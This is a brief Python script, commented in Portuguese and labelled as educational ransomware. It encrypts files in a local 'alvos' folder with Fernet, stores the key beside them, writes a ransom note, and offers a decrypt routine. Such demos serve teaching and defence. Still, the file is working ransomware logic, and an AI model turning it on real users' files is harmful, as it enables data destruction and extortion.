# ransomware_simulado.py
from cryptography.fernet import Fernet
from pathlib import Path

PASTA_ALVOS = Path("alvos")
PASTA_ALVOS.mkdir(exist_ok=True)

CHAVE_ARQUIVO = Path("chave.key")
MENSAGEM_RESGATE = Path("LEIA_IMPORTANTE.txt")

def gerar_chave():
    chave = Fernet.generate_key()
    CHAVE_ARQUIVO.write_bytes(chave)
    print("[+] Chave gerada.")
    return chave

def carregar_chave():
    return CHAVE_ARQUIVO.read_bytes()

def criptografar_arquivos(chave):
    f = Fernet(chave)
    for arquivo in PASTA_ALVOS.iterdir():
        if arquivo.is_file():
            dados = arquivo.read_bytes()
            cript = f.encrypt(dados)
            arquivo.write_bytes(cript)
            print(f"[+] Arquivo criptografado: {arquivo.name}")

def descriptografar_arquivos(chave):
    f = Fernet(chave)
    for arquivo in PASTA_ALVOS.iterdir():
        if arquivo.is_file():
            dados = arquivo.read_bytes()
            try:
                dec = f.decrypt(dados)
                arquivo.write_bytes(dec)
                print(f"[+] Arquivo descriptografado: {arquivo.name}")
            except:
                print(f"[X] Falha ao descriptografar {arquivo.name} (talvez já esteja normal).")

def criar_mensagem_resgate():
    MENSAGEM_RESGATE.write_text(
        "Seus arquivos foram criptografados!\n"
        "Este é apenas um EXEMPLO EDUCACIONAL.\n"
        "Use sua chave para reverter o processo."
    )
    print("[+] Mensagem de resgate criada.")

if __name__ == "__main__":
    print("=== Ransomware Simulado (educacional) ===")
    chave = gerar_chave()
    criar_mensagem_resgate()
    criptografar_arquivos(chave)
    print("\nExecute novamente com: descriptografar_arquivos(carregar_chave()) para reverter.")
